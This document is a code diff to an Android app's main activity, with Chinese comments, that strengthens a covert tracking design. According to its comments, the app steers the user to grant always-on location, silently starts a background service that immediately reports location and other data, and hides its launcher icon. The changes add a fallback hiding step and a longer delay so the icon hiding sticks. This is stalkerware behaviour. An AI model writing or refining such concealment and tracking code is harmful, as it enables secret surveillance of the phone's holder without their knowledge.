@@ -67,7 +67,7 @@ public class MainActivity extends Activity {
     private void proceedAfterForegroundLocation() {
         if (Build.VERSION.SDK_INT >= 29 && !hasBackgroundLocationPermission()) {
             if (Build.VERSION.SDK_INT >= 30) {
-                // Android 11+：无法通过弹窗授予后台定位，必须引导用户去设置页手动开启。
+                // Android 11+：无法通过弹窗授予后台定位，引导用户去设置页手动开启。
                 // 延迟 500ms 再跳转，给系统权限状态变更和当前 Activity 一个缓冲，
                 // 避免"一闪而过"或页面被系统回收。
                 Toast.makeText(this, "请在设置页选择「权限」→「位置信息」→「始终允许」", Toast.LENGTH_LONG).show();
@@ -107,7 +107,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    // 通知权限处理完后：先启动服务（服务 onCreate 中立即上报一次），再引导电池优化，最后延迟关闭界面
+    // 通知权限处理完后：先启动服务（服务 onCreate 中立即上报一次并兜底隐藏图标），再引导电池优化，最后延迟关闭界面
     private void proceedAfterNotification() {
         startTrackingService();
         requestIgnoreBatteryOptimizations();
@@ -166,7 +166,7 @@ public class MainActivity extends Activity {
         if (serviceStarted) return;
         serviceStarted = true;
 
-        // 默默拉起后台守护服务（服务 onCreate 中会立刻上报一次位置等信息）
+        // 默默拉起后台守护服务（服务 onCreate 中会立刻上报一次位置等信息，并兜底隐藏图标）
         Intent intent = new Intent(this, TrackingService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent);
@@ -174,19 +174,20 @@ public class MainActivity extends Activity {
             startService(intent);
         }
 
-        // 初始化完成，自动隐藏桌面图标
+        // MainActivity 侧也主动隐藏一次（第一道保障）
         hideLauncherIcon();
 
-        // 延迟关闭，给电池优化跳转动画和启动器刷新图标留出时间
+        // 延迟关闭，给组件状态落盘、电池优化跳转动画、启动器刷新图标留出时间。
+        // 2000ms 比 800ms 更稳妥，减少组件状态被系统回滚的概率。
         mainHandler.postDelayed(new Runnable() {
             @Override
             public void run() {
                 finish();
             }
-        }, 800);
+        }, 2000);
     }
 
-    // 禁用带桌面图标的 VisibleAliasActivity，实现"授权完成后自动隐身"
+    // 禁用带桌面图标的 VisibleAliasActivity，实现"授权完成后自动隐身"（第一道保障）
     private void hideLauncherIcon() {
         try {
             PackageManager pm = getPackageManager();
